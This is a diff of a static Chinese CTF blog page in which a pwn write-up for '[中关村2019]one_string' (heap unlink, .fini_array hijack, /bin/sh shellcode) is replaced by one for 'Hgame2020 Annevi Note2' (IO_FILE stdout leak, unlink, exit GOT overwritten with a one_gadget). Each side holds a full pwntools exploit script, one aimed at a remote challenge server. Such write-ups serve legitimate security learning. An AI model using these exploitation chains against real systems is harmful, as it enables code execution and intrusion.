@@ -15,17 +15,17 @@
 
 
 
-<meta name="description" content="buuoj上面做的">
+<meta name="description" content="Do you know the IO_FILE?">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[中关村2019]one_string">
-<meta property="og:url" content="http://yoursite.com/2019/09/24/中关村2019-one-string/index.html">
+<meta property="og:title" content="Hgame2020_Week3_Pwn_Annevi_Note2">
+<meta property="og:url" content="http://yoursite.com/2020/02/12/Hgame2020-Week3-Pwn-Annevi-Note2/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="buuoj上面做的">
+<meta property="og:description" content="Do you know the IO_FILE?">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-09-24T14:12:02.608Z">
+<meta property="og:updated_time" content="2020-02-12T06:37:45.936Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="[中关村2019]one_string">
-<meta name="twitter:description" content="buuoj上面做的">
+<meta name="twitter:title" content="Hgame2020_Week3_Pwn_Annevi_Note2">
+<meta name="twitter:description" content="Do you know the IO_FILE?">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -57,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>[中关村2019]one_string | 4eriri&#39;s blog</title>
+<title>Hgame2020_Week3_Pwn_Annevi_Note2 | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -200,11 +200,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-中关村2019-one-string" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Hgame2020-Week3-Pwn-Annevi-Note2" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/09/24/中关村2019-one-string/" class="article-date">
-      <time datetime="2019-09-24T13:48:42.000Z" itemprop="datePublished">2019-09-24</time>
+      <a href="/2020/02/12/Hgame2020-Week3-Pwn-Annevi-Note2/" class="article-date">
+      <time datetime="2020-02-12T06:29:37.000Z" itemprop="datePublished">2020-02-12</time>
 </a>
 
 
@@ -219,7 +219,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      [中关村2019]one_string
+      Hgame2020_Week3_Pwn_Annevi_Note2
     </h1>
   
 
@@ -236,15 +236,19 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>buuoj上面做的</p>
+        <p>Do you know the IO_FILE?</p>
 <a id="more"></a>
-<p>edit的时候，会重新记录size，这个size使用strlen计算。</p>
-<p>如果申请一个可以复用下一个chunk的presize段的chunk，然后使用edit填充满，这样再下一次edit时使用的size就可以覆盖掉下一个chunk的size。</p>
-<p>然后构造unlink，就可以任意写。</p>
-<p>可是不知道咋控制程序执行流，甚至想在<code>malloc_hook上</code>写bss段地址，然后在bss段地址上写shellcode来执行，然后不知道哪里出了问题没啥卵用。</p>
-<p>最终<a href="https://wulidecade.cn/2019/08/16/中关村第三届新兴领域专题赛WP/" target="_blank" rel="noopener">参考了Decade表哥的wp</a>，修改<code>.fini_array</code>来控制程序执行流。</p>
-<p><code>.fini_array</code>数组，里面保存着程序执行完之后执行的函数，这里的思路是可以覆盖<code>.fini_array</code>数组的内容来控制程序执行流程。有一点需要注意的是<code>.fini_array</code>数组里保存的函数是逆序执行的，也就是说会先执行<code>.fini_array[1]</code>再执行<code>.fini_array[0]</code>。例如可以将<code>.fini_array[1]</code>的值改为main函数的地址，将<code>.fini_array[0]</code>改成调用控制<code>.fini_array</code>的函数0x402960，这样执行完main之后就执行又继续执行调用main函数的函数。这样就可以形成循环一直任意地址覆盖写。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *from LibcSearcher import *sh=process(&quot;./pwn-2.dms&quot;)#sh=remote(&quot;node2.buuoj.cn.wetolink.com&quot;,28568)sh.recvuntil(&quot;input:\n&quot;)def add(index,content):	sh.sendline(&quot;1&quot;)	sh.sendline(str(int(index)))	sh.sendline(content)def delete(index):	sh.sendline(&quot;2&quot;)	sh.sendline(str(int(index)))def edit(index,content):	sh.sendline(&quot;3&quot;)	sh.sendline(str(int(index)))	sh.sendline(content)size=0x080EBA00ptr=0x80eba40+12shellcode  = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;shellcode += &quot;\x0b\xcd\x80&quot;add(0x20,&apos;\xff&apos;)#0add(0x18,&apos;\xff&apos;)#1add(0x18,&apos;\xff&apos;)#2add(0x64,p32(0)+p32(0x60)+p32(0xffffffff)*24)#3add(0x60,&apos;\xff&apos;)#4add(0x18,&apos;\xff&apos;)#5edit(3,p32(0xffffffff)*25)edit(3,p32(0xffffffff)+p32(0x61)+p32(ptr-12)+p32(ptr-8)+p32(0xffffffff)*20+p32(0x60)+p32(0x68))delete(4)edit(3,p32(0x80e9f74))edit(0,p32(0)+p32(0x80e9f7c)+shellcode+&apos;\x00&apos;)sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>和<a href="http://4eriri.top/2020/02/01/Hgame2020-Week3-Pwn-Annevi-Note/" target="_blank" rel="noopener">第一题</a>差不多</p>
+<p>区别是init函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int init()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;Annevi!The eternal God!&quot;);</span><br><span class="line">  puts(&quot;Welcome to Annevi&apos;s note2&quot;);</span><br><span class="line">  return close(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里close(1)之后，由于文件描述符1被关闭就没有输出了。可以通过修改stdout-&gt;_fileno为2，使用stderr来进行输出，则可以使得程序和第一题一摸一样。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh.recvuntil(&quot;note2\n&quot;)sh.sendline(&quot;4&quot;)sh.sendline(str(-8))sh.sendline(p64(0xfbad1887)+p64(0)*13+p64(2))</span><br></pre></td></tr></table></figure>
+<p>之后利用stdout来leak，再构造unlink，修改exit的got表为onegadget，执行exit获取shell。</p>
+<p>获取shell后执行命令提示</p>
+<p><code>ls: write error: Bad file descriptor</code></p>
+<p>可以使用 <code>sh 1&gt;&amp;2</code> 重定向来解决</p>
+<p>EXP:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8from pwn import *context(arch=&apos;amd64&apos;, os=&apos;linux&apos;, log_level=&apos;debug&apos;)one=[0x45216,0x4526a,0xf02a4,0xf1147]debug = 0if debug:	sh = process(&quot;/media/psf/Home/Downloads/AN2&quot;)else:	sh=remote(&quot;47.103.214.163&quot;,20701)def D():	cmd=&apos;&apos;&apos;	&apos;&apos;&apos;	gdb.attach(sh,cmd)#libcbase=0x7f6a388bf000+puts-0x7f6a3892e690#libcbase=mainarena-0x3c4b20def add(size,content):	sh.recvuntil(&quot;:&quot;)	sh.sendline(&quot;1&quot;)	sh.recvuntil(&quot;size?\n&quot;)	sh.sendline(str(size))	sh.recvuntil(&quot;content:&quot;)	sh.sendline(content)def delete(idx):	sh.recvuntil(&quot;:&quot;)	sh.sendline(&quot;2&quot;)	sh.recvuntil(&quot;index?\n&quot;)	sh.sendline(str(idx))def show(idx):	sh.recvuntil(&quot;:&quot;)	sh.sendline(&quot;3&quot;)	sh.recvuntil(&quot;index?\n&quot;)	sh.sendline(str(idx))def edit(idx,content):	sh.recvuntil(&quot;:&quot;)	sh.sendline(&quot;4&quot;)	sh.recvuntil(&quot;index?\n&quot;)	sh.sendline(str(idx))	sh.recvuntil(&quot;content:&quot;)	sh.sendline(content)lis=0x0000000006020E0sh.recvuntil(&quot;note2\n&quot;)sh.sendline(&quot;4&quot;)sh.sendline(str(-8))sh.sendline(p64(0xfbad1887)+p64(0)*13+p64(2))edit(-8,p64(0xfbad1887)+p64(0)*3+&apos;\x08&apos;)sh.recvuntil(p64(0xfbad1887)+p64(0)*3)leak=u64(sh.recv(8))libcbase=leak-0x7fb45c86f608+0x7fb45c4aa000log.success(&quot;libcbase : &quot;+hex(libcbase))add(0x90,&apos;\x00&apos;)add(0x90,&apos;\x01&apos;)add(0x90,&apos;\x02&apos;)edit(0,p64(0)+p64(0x91)+p64(lis-0x18)+p64(lis-0x10)+p64(0)*14+p64(0x90)+p64(0xa0))delete(1)edit(0,p64(0)*3+p64(0x602078))edit(0,p64(libcbase+one[3]))sh.recvuntil(&quot;:&quot;)sh.sendline(&quot;5&quot;)sh.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -252,13 +256,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/09/24/中关村2019-one-string/">[中关村2019]one_string</a></p>
+        <p><span>本文标题:</span><a href="/2020/02/12/Hgame2020-Week3-Pwn-Annevi-Note2/">Hgame2020_Week3_Pwn_Annevi_Note2</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2019-09-24, 21:48:42</p>
-        <p><span>最后更新:</span>2019-09-24, 22:12:02</p>
+        <p><span>发布时间:</span>2020-02-12, 14:29:37</p>
+        <p><span>最后更新:</span>2020-02-12, 14:37:45</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/09/24/中关村2019-one-string/" title="[中关村2019]one_string">http://yoursite.com/2019/09/24/中关村2019-one-string/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/09/24/中关村2019-one-string/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2020/02/12/Hgame2020-Week3-Pwn-Annevi-Note2/" title="Hgame2020_Week3_Pwn_Annevi_Note2">http://yoursite.com/2020/02/12/Hgame2020-Week3-Pwn-Annevi-Note2/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/02/12/Hgame2020-Week3-Pwn-Annevi-Note2/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -270,16 +274,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/09/25/ciscn-2019-sw-7/">
-                    ciscn_2019_sw_7
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/09/23/ciscn-2019-final-5/">
-                    ciscn_2019_final_5
+                <a href="/2020/02/01/Hgame2020-Week3-Reverse/">
+                    Hgame2020_Week3_Reverse
                 </a>
             </div>
         
@@ -327,7 +325,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"[中关村2019]one_string　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"Hgame2020_Week3_Pwn_Annevi_Note2　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -346,8 +344,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://yoursite.com/2019/09/24/中关村2019-one-string/';
-            this.page.identifier = '2019/09/24/中关村2019-one-string/';
+            this.page.url = 'http://yoursite.com/2020/02/12/Hgame2020-Week3-Pwn-Annevi-Note2/';
+            this.page.identifier = '2020/02/12/Hgame2020-Week3-Pwn-Annevi-Note2/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -369,15 +367,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/09/25/ciscn-2019-sw-7/" title="上一篇: ciscn_2019_sw_7">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/09/23/ciscn-2019-final-5/" title="下一篇: ciscn_2019_final_5">
+            <a href="/2020/02/01/Hgame2020-Week3-Reverse/" title="下一篇: Hgame2020_Week3_Reverse">
                 <i class="fa fa-angle-right"></i>
             </a>
         
